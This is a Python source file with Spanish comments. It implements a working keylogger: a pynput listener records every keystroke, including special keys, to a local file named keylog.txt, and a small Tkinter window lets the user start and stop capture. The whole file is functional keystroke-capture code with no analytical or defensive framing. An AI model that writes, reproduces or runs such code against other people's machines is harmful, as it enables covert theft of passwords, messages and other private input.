from tkinter import Tk, Button, Label, StringVar
from pynput.keyboard import Listener, Key
import logging
import threading

# Configuración del archivo de log
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

class Keylogger:
    def __init__(self):
        self.listener = None
        self.is_running = False

    # Función para manejar teclas presionadas
    def on_press(self, key):
        try:
            logging.info(str(key.char))
        except AttributeError:
            special_keys = {
                Key.space: " ",
                Key.enter: "[ENTER]",
                Key.backspace: "[BACKSPACE]"
            }
            logging.info(special_keys.get(key, f"[{key}]"))

    # Inicia el keylogger en un hilo separado
    def start_keylogger(self):
        if not self.is_running:
            self.is_running = True
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            status_var.set("Estado: Ejecutándose")

    # Detiene el keylogger
    def stop_keylogger(self):
        if self.is_running:
            self.is_running = False
            self.listener.stop()
            status_var.set("Estado: Detenido")

# Configuración de la GUI
def create_gui():
    root = Tk()
    root.title("Keylogger Control")
    root.geometry("300x150")

    global status_var
    status_var = StringVar()
    status_var.set("Estado: Detenido")

    # Botones y etiquetas
    Label(root, textvariable=status_var, pady=10).pack()
    Button(root, text="Iniciar Keylogger", command=keylogger.start_keylogger, bg="green", fg="white").pack(pady=5)
    Button(root, text="Parar Keylogger", command=keylogger.stop_keylogger, bg="red", fg="white").pack(pady=5)
    Label(root, text="⚠️ Keylogger ", fg="red").pack(pady=10)

    root.mainloop()

# Inicialización
if __name__ == "__main__":
    keylogger = Keylogger()
    gui_thread = threading.Thread(target=create_gui)
    gui_thread.start()